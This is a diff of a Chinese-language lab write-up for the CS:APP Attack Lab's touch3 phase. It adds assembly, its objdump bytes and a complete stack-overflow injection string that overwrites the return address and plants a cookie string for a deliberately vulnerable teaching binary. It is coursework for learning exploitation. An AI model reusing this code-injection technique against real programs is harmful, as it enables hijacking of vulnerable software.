@@ -341,12 +341,54 @@ b9 59 c3 00 00 00 00 00
 
 那么往后推，就可以将ret的后一段地址作为字符串存放的位置。这样可以避免被覆盖，进行注入。
 
+![image-20211030114624766](实验3：AttackLab.assets/image-20211030114624766.png)
 
+先找到getbuf当前栈所在的位置，为0x5561dca0，这个位置作为返回值地址，而cookie字符串地址采用text帧的下一个地址，0x5561dca8。
+
+为了让val读取到字符串，应将0x5561dca8地址赋值给rdi寄存器作为第一个参数。
+
+```assembly
+push $0x4018fa
+mov  $0x5561dca8,%edi
+ret
+```
+
+经过gcc和objdump得到字节码
+
+```assembly
+
+touch3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	68 fa 18 40 00       	pushq  $0x4018fa
+   5:	bf a8 dc 61 55       	mov    $0x5561dca8,%edi
+   a:	c3                   	retq   
+
+```
+
+得到的字符串为 68 fa 18 40 00 bf a8 dc 61 55 c3 
+
+最终构造的格式如下图：
+
+![未命名文件 (1)](实验3：AttackLab.assets/未命名文件 (1).png)
 
 rsp栈帧执行的操作为
 
 ```
+68 fa 18 40 00 bf a8 dc 
+61 55 c3 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00   
+35 39 62 39 39 37 66 61 
 ```
 
+其中1-5行为分配的地址，6行为返回值地址，7行为cookie地址。
 
+最后验证结果通过
 
+![image-20211030120524060](实验3：AttackLab.assets/image-20211030120524060.png)
